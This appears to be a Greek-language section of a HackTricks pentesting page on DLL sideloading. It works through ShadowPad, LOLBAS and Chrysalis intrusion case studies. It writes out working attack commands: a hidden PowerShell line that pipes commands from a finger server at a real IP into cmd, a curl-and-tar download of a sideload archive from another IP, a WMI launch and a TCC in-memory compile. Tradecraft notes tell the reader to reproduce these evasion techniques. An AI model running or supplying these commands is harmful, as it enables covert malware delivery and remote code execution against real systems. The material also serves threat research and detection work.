## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (ShadowPad case study)

Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **three-file triad** για να μπερδευτεί με νόμιμο λογισμικό ενώ κρατά τον core payload κρυπτογραφημένο στο δίσκο:

1. **Signed host EXE** – εκμεταλλεύονται vendors όπως AMD, Realtek, ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με Windows binary (π.χ. `conhost.exe`), αλλά η Authenticode υπογραφή παραμένει έγκυρη.
2. **Malicious loader DLL** – απορρίπτεται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μόνος σκοπός της είναι να εντοπίσει το encrypted blob, να το decryptάρει και να reflectively map-άρει το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκευμένο ως `<name>.tmp` στον ίδιο φάκελο. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP αρχείο για να καταστρέψει τα εγκληματολογικά ίχνη.

Σημειώσεις tradecraft:

* Η μετονομασία του signed EXE (διατηρώντας το πρωτότυπο `OriginalFileName` στο PE header) το αφήνει να μιμηθεί ένα Windows binary ενώ διατηρεί την vendor υπογραφή — αναπαράγετε το habit του Ink Dragon να αφήνει `conhost.exe`-φαίνουσες binaries που στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το εκτελέσιμο παραμένει trusted, τα περισσότερα allowlisting controls χρειάζονται μόνο η malicious DLL να βρίσκεται δίπλα του. Επικεντρωθείτε στην παραμετροποίηση του loader DLL· ο signed parent συνήθως μπορεί να τρέξει αμετάβλητος.
* Ο decryptor του ShadowPad περιμένει το TMP blob δίπλα στον loader και να είναι writable ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Κρατήστε τον κατάλογο writable μέχρι να φορτωθεί το payload· μόλις είναι στη μνήμη, το TMP αρχείο μπορεί να διαγραφεί με ασφάλεια για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators συνδυάζουν DLL sideloading με LOLBAS έτσι ώστε το μόνο custom artifact στο δίσκο να είναι η malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell spawn-άρει `cmd.exe /c`, τραβάει εντολές από έναν Finger server, και τις pipe-άρει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` τραβάει TCP/79 text· `| cmd` εκτελεί την απάντηση του server, επιτρέποντας στους operators να αλλάζουν τον second stage server-side.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, αποσυμπιέστε το, και stage-άρετε το sideload target μαζί με τη DLL κάτω από έναν τυχαίο `%LocalAppData%` φάκελο:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` κρύβει την πρόοδο και ακολουθεί redirects· `tar -xf` χρησιμοποιεί το built-in tar των Windows.

- **WMI/CIM launch:** Ξεκινήστε το EXE μέσω WMI ώστε η τηλεμετρία να δείχνει μια CIM-created διαδικασία ενώ φορτώνει την colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ., `intelbq.exe`, `nearby_share.exe`); το payload (π.χ., Remcos) τρέχει υπό το trusted όνομα.

- **Hunting:** Ειδοποιήστε για `forfiles` όταν εμφανίζονται μαζί `/p`, `/m` και `/c`; ασυνήθιστο εκτός admin scripts.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom εκμεταλλεύτηκε ένα trusted update chain για να παραδώσει έναν NSIS-packed dropper που staged ένα DLL sideload συν πλήρως in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) δημιουργεί `%AppData%\Bluetooth`, το σημειώνει **HIDDEN**, απορρίπτει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, μια malicious `log.dll`, και ένα encrypted blob `BluetoothService`, και στη συνέχεια εκκινεί το EXE.
- Το host EXE εισάγει `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-load-άρει το blob· το `LogWrite` το decryptάρει με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material παράγεται από ένα προηγούμενο hash), αντικαθιστά το buffer με plaintext shellcode, απελευθερώνει temps και κάνει jump σε αυτό.
- Για να αποφύγει ένα IAT, ο loader επιλύει APIs κάνοντας hashing των export names χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, έπειτα εφαρμόζοντας μια Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε πέντε περάσματα, στη συνέχεια δυναμικά φορτώνει `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση imports.
- Ανασυνθέτει strings ονομάτων DLL σε runtime μέσω per-character bit-rotate/XOR μετασχηματισμών, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που περπατά το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε 4-byte blocks με Murmur-style mixing, και επανέρχεται σε `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Η config βρίσκεται μέσα στο dropped `BluetoothService` αρχείο στη **offset 0x30808** (μέγεθος **0x980**) και είναι RC4-decrypted με key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons κατασκευάζουν ένα dot-delimited host profile, προσθέτουν tag `4Q`, και μετά RC4-encryptάρουν με key `vAuig34%^325hGV` πριν το `HttpSendRequestA` πάνω από HTTPS. Οι απαντήσεις RC4-decryptάρονται και διανέμονται από ένα tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode ελέγχεται από CLI args: χωρίς args = εγκαθιστά persistence (service/Run key) δείχνοντας σε `-i`; `-i` relaunches self με `-k`; `-k` παρακάμπτει το install και τρέχει το payload.

Alternate loader observed
- Η ίδια intrusion απορρίπτει Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από `C:\ProgramData\USOShared\`, με `libtcc.dll` δίπλα του. Ο attacker-supplied C source embedded shellcode, compiled και ran in-memory χωρίς να αγγίξει το δίσκο με ένα PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτή η TCC-based compile-and-run stage φόρτωσε τη `Wininet.dll` κατά το runtime και κατέβασε second-stage shellcode από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που εμφανιζόταν ως εκτέλεση compiler.

## Αναφορές

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
